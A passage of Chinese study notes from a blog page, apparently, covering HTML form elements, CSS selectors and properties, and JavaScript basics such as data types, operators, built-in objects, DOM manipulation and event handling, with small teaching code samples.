日期</p></li><li><p>email 邮箱输入框，会进行格式校验</p></li><li><p>number 只能输入数字</p></li></ul><p>label标签 指定输入项的文字描述信息</p><blockquote><p>label的for属性一般和input的name属性对应，对应后，点击label区域，会让input输入框获取焦点</p></blockquote><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>下拉列表</p><ul><li>子元素： option指定列表项</li></ul><h4 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h4><p>文本域</p><ul><li>cols 指定列数，每行有几个字符</li><li>rows 指定行数，最多几行</li></ul><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>内容与样式分离</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="三种样式"><a href="#三种样式" class="headerlink" title="三种样式"></a>三种样式</h3><ol><li>内联样式</li></ol><ul><li>在标签内使用style属性指定css代码<ul><li>如：<code>&lt;div style=&quot;color:red;&quot;&gt;hello css&lt;/div&gt;</code></li></ul></li></ul><ol start="2"><li><p>内部样式</p><ul><li><p>在head标签内，定义style标签，style标签的标签体内容就是css代码</p></li><li><p>如：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">color</span>:blue;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>外部样式</p><ol><li>定义css资源文件。</li><li>在head标签内，定义link标签，引入外部的资源文件</li></ol><ul><li><p>如：a.css文件：</p><div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--html文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/a.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li></ol><blockquote><p>注意：</p><ul><li><p>1,2,3种方式 css作用范围越来越大</p></li><li><p>1方式不常用，后期常用2,3</p></li><li><p>3种格式可以写为：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@import</span> <span class="string">&quot;css/a.css&quot;</span>;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><h3 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h3><p>都要在style标签内</p><div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择器 &#123;</span><br><span class="line">  属性名<span class="number">1</span>:值<span class="number">1</span>;</span><br><span class="line">  属性名<span class="number">2</span>:值<span class="number">2</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>注意：各属性间用<code>;</code>隔开 最后一个元素可加可不加</p></blockquote><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><p>选择器：筛选具有相同特征的元素</p><h4 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h4><ul><li><p>id选择器：选择具体id属性值的元素</p><ul><li><p>语法：#id属性值{} </p><blockquote><p>建议id值在一个html文件中唯一</p></blockquote></li></ul></li><li><p>元素选择器:选择具有相同标签名称的元素</p><ul><li><p>标签名称{}</p><blockquote><p>id选择器优先级高于元素选择器</p></blockquote></li></ul></li><li><p>类选择器：选择具有相同class属性值的元素</p><ul><li><p>.class属性值{}</p><blockquote><p>类选择器优先级高于元素选择器</p><p>优先级 id选择器&gt;类选择器&gt;元素选择器</p></blockquote></li></ul></li></ul><blockquote><p>注意：属性值不能以数字开头，也不能纯数字</p></blockquote><h4 id="扩展选择器"><a href="#扩展选择器" class="headerlink" title="扩展选择器"></a>扩展选择器</h4><ul><li><p>选择所有元素</p><ul><li>*{}</li></ul></li><li><p>并集选择器</p><ul><li>选择器1,选择器2{}</li></ul></li><li><p>后代选择器：筛选选择器1元素下所有的选择器2（包括其孙类中的）</p><ul><li>选择器1 选择器2{}</li></ul></li><li><p>子选择器:筛选父元素是选择器1的选择器2（只看直接子类）</p><ul><li>选择器1&gt;选择器2{}</li></ul><blockquote><p>注意，如果选择器2元素内有子标签，则会连同子标签一起使用样式，后代选择器和子选择器都有这种效果</p><ul><li>可在选择器后加<code>:first-child</code> 或<code>:last-child</code>表示选择第一个子类或最后一个 </li><li>⚠️这种加冒号，冒号和左右两个字符串都不能有空格间隙</li></ul></blockquote></li><li><p>属性选择器:选择元素名称，属性名&#x3D;属性值的元素</p><ul><li>元素名称[属性名&#x3D;”属性值”]</li></ul></li><li><p>伪类选择器：选择一些元素具有的状态</p><ul><li>语法： 元素:状态{}</li><li><a>:状态<ul><li>状态<ul><li>link 初始化状态</li><li>vistied 被访问过的状态</li><li>active 正在访问状态(鼠标点住不放)</li><li>hover 鼠标悬浮状态</li></ul></li></ul></li></ul></li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4evjjzsv9j20sm0aywfm.jpg"                      alt="image-20220721213511321"                ><figcaption>image-20220721213511321</figcaption></figure></p><h3 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h3><p>一般用在div元素标签下</p><ol><li><p>字体、文本</p><ul><li>font-size 字体大小</li><li>color 文本颜色</li><li>text-align 对齐方式</li><li>line-height：行高</li></ul></li><li><p>背景</p><ul><li>background</li></ul></li><li><p>边框</p><ul><li>border 设置边框，符合属性</li></ul></li><li><p>尺寸</p><ul><li>width 宽度</li><li>height 高度</li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*尺寸*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*背景*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;../image/2.jpg&quot;</span>) no-repeat center;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>盒子模型:控制布局</p><ul><li><p>margin 外边距</p></li><li><p>padding 内边距</p><ul><li><p>默认情况下内边距会影响盒子大小</p><blockquote><p><code>box-sizing: border-box;</code> 设置盒子属性,让width height不变</p></blockquote></li></ul></li><li><p>float 浮动</p><ul><li>left 在该行</li><li>right</li></ul></li></ul></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="概念：一门客户端脚本语言"><a href="#概念：一门客户端脚本语言" class="headerlink" title="概念：一门客户端脚本语言"></a>概念：一门客户端脚本语言</h3><ul><li>运行在客户端浏览器中的。每一个浏览器都有JavaScript的解析引擎</li><li>脚本语言：不需要编译，直接就可以被浏览器解析执行了</li></ul><h3 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h3><ul><li>可以来增强用户和html页面的交互过程，可以来控制html元素，让页面有一些动态的效果，增强用户的体验。</li></ul><h3 id="JavaScript发展史："><a href="#JavaScript发展史：" class="headerlink" title="JavaScript发展史："></a>JavaScript发展史：</h3><ol><li>1992年，Nombase公司，开发出第一门客户端脚本语言，专门用于表单的校验。命名为 ： C–，后来更名为：ScriptEase</li><li>1995年，Netscape(网景)公司，开发了一门客户端脚本语言：LiveScript。后来，请来SUN公司的专家，修改LiveScript，命名为JavaScript</li><li>1996年，微软抄袭JavaScript开发出JScript语言</li><li>1997年，ECMA(欧洲计算机制造商协会)，制定出客户端脚本语言的标准：ECMAScript，就是统一了所有客户端脚本语言的编码方式。</li></ol><blockquote><p>JavaScript &#x3D; ECMAScript + JavaScript自己特有的东西(BOM+DOM)</p></blockquote><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ol><li><h4 id="与html结合方式"><a href="#与html结合方式" class="headerlink" title="与html结合方式"></a>与html结合方式</h4><ul><li>内部JS：<ul><li>定义<script>，标签体内容就是js代码</li></ul></li><li>外部JS<ul><li>定义<script>，通过src属性引入外部的js文件</li></ul></li></ul></li></ol><blockquote><pre><code>    - `&lt;script&gt;`可以定义在html页面的任何地方。但是定义的位置会影响执行顺序。        - `&lt;script&gt;`可以定义多个。</code></pre></blockquote><ol start="2"><li><h4 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h4><ul><li><p>单行注释：<code>//注释内容</code></p></li><li><p>多行注释：<code>/*注释内容*/</code></p></li></ul></li><li><h4 id="数据类型："><a href="#数据类型：" class="headerlink" title="数据类型："></a>数据类型：</h4><ol><li><p>原始数据类型(基本数据类型)：</p><ul><li><p>number：数字。 整数/小数/NaN(not a number 一个不是数字的数字类型)</p></li><li><p>string：字符串。 字符串  "abc" "a" 'abc'</p><blockquote><p>没有字符的概念</p></blockquote></li><li><p>boolean: true和false</p></li><li><p>null：一个对象为空的占位符</p></li><li><p>undefined：未定义。如果一个变量没有给初始化值，则会被默认赋值为undefined</p></li></ul></li><li><p>引用数据类型：对象</p></li></ol></li><li><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul><li>变量：一小块存储数据的内存空间</li><li>Java语言是强类型语言，而JavaScript是弱类型语言。<ul><li>强类型：在开辟变量存储空间时，定义了空间将来存储的数据的数据类型。只能存储固定类型的数据</li><li>弱类型：在开辟变量存储空间时，<u>不定义空间将来的存储数据类型</u>，可以存放任意类型的数据。</li></ul></li><li>语法 <code>var 变量名 = 初始化值;</code></li><li>typeof运算符：获取变量的类型。<code>typeof(变量名)</code><br>* 注：null运算后得到的是object</li></ul></li><li><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><ul><li><p>一元运算符</p><ol><li>++，-- ， +(正号)</li></ol><ul><li>++ -- 自增 自减 （也有在前在后之分）</li></ul><ol start="2"><li><p>+(-)：正负号</p><ul><li><p>在JS中，如果运算数不是运算符所要求的类型，那么js引擎会自动的将运算数进行类型转换</p><blockquote><p>其他类型转number：</p><ul><li>string转number：按照字面值转换(纯数字字符串才能转数字)。如果字面值不是数字，则转为NaN（不是数字的数字,与别的数字运算，结果仍为NaN）</li><li>boolean转number：true转为1，false转为0</li><li>在其他类型数据前加上+或-会将后面的数据强制转换成number</li></ul></blockquote></li></ul></li></ol></li><li><p>算数运算符</p><ul><li><code>+ - * / % ...</code></li></ul></li><li><p>赋值运算符</p><ul><li>= += -+....</li></ul></li><li><p>比较运算符</p><ul><li><p>< >= <= == ===(全等于)</p><blockquote><p><strong>比较方式</strong></p><ol><li>类型相同：直接比较<ul><li>字符串：按照字典顺序比较。按位逐一比较，直到得出大小为止</li></ul></li><li>类型不同：先进行类型转换，再比较<br>* ===：全等于。在比较之前，先判断类型，如果类型不一样，则直接返回false</li></ol></blockquote></li></ul></li><li><p>逻辑运算符</p><ul><li>&& || ! （&& ||也有短路效果）</li></ul><blockquote><p>其他类型转boolean：</p><ol><li><p>number：<u>0或NaN为假</u>，其他为真</p></li><li><p>string：除了空字符串("")，其他都是true</p></li><li><p>null&undefined:都是false</p></li><li><p>对象：所有对象都为true</p></li></ol></blockquote><p>​</p></li></ul></li></ol><p></p><h4 id="6-三元运算符"><a href="#6-三元运算符" class="headerlink" title="6. 三元运算符"></a>6. 三元运算符</h4><ul><li><p>? : 表达式</p><ul><li><pre><code class="js">var a = 3;var b = 4;var c = a &gt; b ? 1:0;<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &gt; 语法：</span><br><span class="line">    &gt;</span><br><span class="line">    &gt; * 表达式? 值1:值2;</span><br><span class="line">    &gt;</span><br><span class="line">    &gt; * 判断表达式的值，如果是true则取值1，如果是false则取值2</span><br><span class="line"></span><br><span class="line">### 流程控制语句</span><br><span class="line"></span><br><span class="line">1. if...else...</span><br><span class="line">2. switch:</span><br><span class="line"></span><br><span class="line">  * 在java中，switch语句可以接受的数据类型： byte int short char,枚举(1.5) ,String(1.7)</span><br><span class="line"></span><br><span class="line">    ```js</span><br><span class="line">    switch(变量)&#123;</span><br><span class="line">    case 值:</span><br><span class="line">    &#125; //同一个switch内的case后的值类型可以混合</span><br></pre></td></tr></table></figure></div></code></pre></li></ul><ul><li>在JS中,switch语句可以接受任意的原始数据类型</li></ul></li></ul><ol start="3"><li>while</li><li>do...while</li><li>for</li></ol><h3 id="特殊语法"><a href="#特殊语法" class="headerlink" title="特殊语法"></a>特殊语法</h3><ul><li><p>语句以;结尾，如果一行只有一条语句则 ;可以省略 (不建议)</p></li><li><p>变量的定义使用var关键字，也可以不使用</p><ul><li><p>用var： 定义的变量是局部变量</p><ul><li>不用var：定义的变量是全局变量(不建议)</li></ul></li></ul></li></ul><h3 id="练习-99乘法表"><a href="#练习-99乘法表" class="headerlink" title="练习--99乘法表"></a>练习--99乘法表</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    td&#123;</span><br><span class="line">        <span class="attr">border</span>:1px solid ;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;table  align=&#x27;center&#x27;&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;tr&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;td&gt;&quot;</span>)</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(i+<span class="string">&quot;*&quot;</span>+j+<span class="string">&quot;=&quot;</span>+i*j+<span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;/td&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// document.write(&quot;&lt;br&gt;&quot;)</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;/tr&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="基本对象"><a href="#基本对象" class="headerlink" title="基本对象"></a>基本对象</h3><h4 id="1-Function：函数-方法-对象"><a href="#1-Function：函数-方法-对象" class="headerlink" title="1. Function：函数(方法)对象"></a>1. Function：函数(方法)对象</h4><ul><li><p>创建</p><ul><li><p>var fun = new Function(形式参数列表,方法体); （了解即可）</p></li><li><pre><code class="js">function 方法名称(形式参数列表)&#123;    方法体&#125;<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```js</span><br><span class="line">  var 方法名 = function(形式参数列表)&#123;</span><br><span class="line">      方法体</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></code></pre></li></ul><blockquote><p>方法可以重复声明，不会报错，最新版本会覆盖旧版本，也可以用以下格式重新定义方法</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法名 = <span class="keyword">function</span>(<span class="params">形式参数列表</span>)&#123;</span><br><span class="line"> 方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>属性</p><ul><li>length:代表形参的个数</li></ul></li><li><p>特点</p><ul><li><p>方法定义是，形参的类型不用写,返回值类型也不写。</p><ol start="2"><li>方法是一个对象，如果定义名称相同的方法，会覆盖</li></ol><ul><li>在JS中，方法的调用只与方法的名称有关，和参数列表无关 （js没有方法重载）<ul><li>参数传多传少都能执行，传少的话，没接收到数据的形参为undefined，传多也不报错</li></ul></li></ul><ol start="4"><li>在方法声明中有一个隐藏的内置对象（数组），arguments,封装所有的实际参数</li></ol></li></ul></li><li><p>调用：<br>方法名称(实际参数列表);</p></li></ul><h4 id="2-Array-数组对象"><a href="#2-Array-数组对象" class="headerlink" title="2. Array:数组对象"></a>2. Array:数组对象</h4><ul><li>创建：<ul><li>var arr = new Array(元素列表);</li><li>var arr = new Array(默认长度);</li><li>var arr = [元素列表];</li></ul></li><li>方法<ul><li>join(分隔符):将数组中的元素按照指定的分隔符拼接为字符串，分隔符默认为逗号(,)</li><li>push():向数组的末尾添加一个或更多元素，<u>并返回新的长度</u>。</li></ul></li><li>特点：<ul><li>JS中，数组元素的类型可变的。</li><li>JS中，数组长度可变的。操作超出原始长度的元素时，会自动扩容</li><li>打印数组对象，默认用逗号将所有元素连接成字符串</li></ul></li></ul><h4 id="3-Boolean"><a href="#3-Boolean" class="headerlink" title="3. Boolean"></a>3. Boolean</h4><ul><li>属性<ul><li>constructor ：返回构造方法的引用</li><li>prototype：返回对象类型原型的引用</li></ul></li><li>方法<ul><li>toSource() 返回该对象源码</li><li>toString()</li><li>valueOf() 返回Boolean对象原始值</li></ul></li></ul><h4 id="4-Date：日期对象"><a href="#4-Date：日期对象" class="headerlink" title="4. Date：日期对象"></a>4. Date：日期对象</h4><ul><li>创建：<ul><li>var date = new Date();</li></ul></li><li>方法：<ul><li>toLocaleString()：返回当前date对象对应的时间本地字符串格式</li><li>getTime():获取毫秒值。返回当前如期对象描述的时间到1970年1月1日零点的毫秒值差</li></ul></li></ul><h4 id="5-Math：数学对象"><a href="#5-Math：数学对象" class="headerlink" title="5. Math：数学对象"></a>5. Math：数学对象</h4><ul><li><p>创建：<br>* 特点：Math对象不用创建，直接使用。  Math.方法名();</p></li><li><p>方法：</p><ul><li>random():返回 0 ~ 1 之间的随机数。 含0不含1</li><li>ceil(x)：对数进行上舍入。</li><li>floor(x)：对数进行下舍入。</li><li>round(x)：把数四舍五入为最接近的整数。</li></ul></li><li><p>属性：</p><ul><li>PI</li></ul></li></ul><h4 id="6-Number、String-基本数据类型包装类（与Boolean一样）"><a href="#6-Number、String-基本数据类型包装类（与Boolean一样）" class="headerlink" title="6. Number、String 基本数据类型包装类（与Boolean一样）"></a>6. Number、String 基本数据类型包装类（与Boolean一样）</h4><h4 id="7-RegExp：正则表达式对象"><a href="#7-RegExp：正则表达式对象" class="headerlink" title="7. RegExp：正则表达式对象"></a>7. RegExp：正则表达式对象</h4><ul><li><p>正则表达式：定义字符串的组成规则。</p><ul><li><p>单个字符:[]</p><ul><li><p>如： [a] [ab] [a-zA-Z0-9_]</p><pre><code>* 特殊符号代表特殊含义的单个字符:</code></pre><ul><li>\d:单个数字字符 [0-9]</li><li>\w:单个单词字符[a-zA-Z0-9_]</li></ul></li></ul></li><li><p>量词符号：</p><ul><li>?：表示出现0次或1次</li><li>*：表示出现0次或多次</li><li>+：出现1次或多次</li><li>{m,n}:表示 m<= 数量 <= n<ul><li>m如果缺省： {,n}:最多n次</li><li>n如果缺省：{m,} 最少m次</li></ul></li></ul></li><li><p>开始结束符号</p><ul><li>^:开始</li><li>$:结束</li></ul></li></ul></li><li><p>正则对象：</p><ul><li><p>创建</p><ul><li>var reg = new RegExp("正则表达式");</li><li>var reg = /正则表达式/;</li></ul></li><li><p>方法</p><ul><li>test(参数):验证指定的字符串是否符合正则定义的规范</li></ul></li></ul></li></ul><p></p><h4 id="8-Global"><a href="#8-Global" class="headerlink" title="8. Global"></a>8. Global</h4><ul><li><p>特点：全局对象，这个Global中封装的方法不需要对象就可以直接调用。  方法名();</p></li><li><p>方法：</p><ul><li><p>encodeURI():url编码</p></li><li><p>decodeURI():url解码</p></li><li><p>encodeURIComponent():url编码,<u>编码的字符更多</u></p></li><li><p>decodeURIComponent():url解码</p></li><li><p>parseInt():将字符串转为数字</p><ul><li>逐一判断每一个字符是否是数字，直到不是数字为止，将前边数字部分转为number</li></ul></li><li><p>isNaN():判断一个值是否是NaN</p><ul><li>NaN六亲不认，连自己都不认。NaN参与的==比较全部为false，因此判断要用isNaN函数</li></ul></li><li><p>eval(): 传入JavaScript代码字符串，并把它作为脚本代码来执行。</p></li></ul></li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="简单学习"><a href="#简单学习" class="headerlink" title="简单学习"></a>简单学习</h3><ul><li><p>功能：控制html文档的内容</p></li><li><p>获取页面标签(元素)对象：Element</p><ul><li>document.getElementById("id值"):通过元素的id获取元素对象</li></ul></li><li><p>操作Element对象：</p><ol><li><p>修改属性值：</p><ol><li>明确获取的对象是哪一个</li><li>查看API文档，找其中有哪些属性可以设置</li></ol></li><li><p>修改标签体内容：</p><ul><li>属性：innerHTML</li></ul><ol><li>获取元素对象</li><li>使用innerHTML属性修改标签体内容</li></ol></li></ol></li></ul><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="简单学习-1"><a href="#简单学习-1" class="headerlink" title="简单学习"></a>简单学习</h3><ul><li>功能： 某些组件被执行了某些操作后，触发某些代码的执行。</li></ul><ul><li><p>如何绑定事件</p><ul><li>直接在html标签上，指定事件的属性(操作)，属性值就是js代码<ul><li>事件：onclick--- 单击事件</li></ul></li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;light&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>  <span class="attr">onclick</span>=<span class="string">&quot;js代码&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>也可以把js代码执行封装成函数，js代码处只写函数</p></blockquote><ul><li>通过js获取元素对象，指定事件属性，设置一个函数</li></ul></li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.获取light2对象</span></span><br><span class="line"><span class="keyword">var</span> light2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;light2&quot;</span>);</span><br><span class="line"><span class="comment">//2.绑定事件</span></span><br><span class="line">light2.<span class="property">onclick</span> = fun2;</span><br></pre></td></tr></table></figure></div><h3 id="事件监听机制："><a href="#事件监听机制：" class="headerlink" title="事件监听机制："></a>事件监听机制：</h3><ul><li><p>概念：某些组件被执行了某些操作后，触发某些代码的执行。</p><ul><li>事件：某些操作。如： 单击，双击，键盘按下了，鼠标移动了</li><li>事件源：组件。如： 按钮 文本输入框...</li><li>监听器：代码。</li><li>注册监听：将事件，事件源，监听器结合在一起。 当事件源上发生了某个事件，则触发执行某个监听器代码。</li></ul></li><li><p>常见的事件：</p><ol><li><p>点击事件：</p></li><li><p>onclick：单击事件</p></li><li><p>ondblclick：双击事件</p></li><li><p>焦点事件</p></li><li><p>onblur：失去焦点</p><ul><li>一般用于表单验证</li></ul></li><li><p>onfocus:元素获得焦点。</p></li><li><p>加载事件：</p></li><li><p>onload：一张页面或一幅图像完成加载。</p><ul><li>可以设置window的该事件触发函数为要使用的js代码，这样可以把js标签放在head里，不会报错找不到标签（因为标签加载完成才执行）</li></ul></li><li><p>鼠标事件：</p></li><li><p>onmousedown鼠标按钮被按下。</p><ul><li>定义方法时，定义一个形参，接受event对象。</li><li>event对象的button属性可以获取鼠标按钮键被点击了。</li></ul></li><li><p>onmouseup鼠标按键被松开。</p></li><li><p>onmousemove鼠标被移动。</p></li><li><p>onmouseover鼠标移到某元素之上。</p></li><li><p>onmouseout鼠标从某元素移开。</p></li><li><p>键盘事件：</p><ol><li>onkeydown某个键盘按键被按下。</li><li>onkeyup某个键盘按键被松开。</li><li>onkeypress某个键盘按键被按下并松开。</li></ol></li><li><p>选择和改变</p><ol><li>onchange域的内容被改变。</li><li>onselect文本被选中。</li></ol></li><li><p>表单事件：</p><ol><li><p>onsubmit确认按钮被点击。</p><ul><li>可以阻止表单的提交</li><li>方法返回false则表单被阻止提交。</li></ul><blockquote><p>封装在标签属性中时注意执行的js代码</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkForm</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//校验</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> id=<span class="string">&quot;form&quot;</span> onclick=<span class="string">&quot;return checkForm();&quot;</span>&gt; <span class="comment">//要return校验函数，因为底层是将onclick后js代码封装成函数，这个函数赋值给标签的onclick事件，看的是该函数返回值，如果只有一行执行校验函数，则没有返回值</span></span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>onreset重置按钮被点击。</p></li></ol></li></ol></li></ul><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>Browser Object Model 浏览器对象模型</p><ul><li>将浏览器的各个组成部分封装成对象。</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     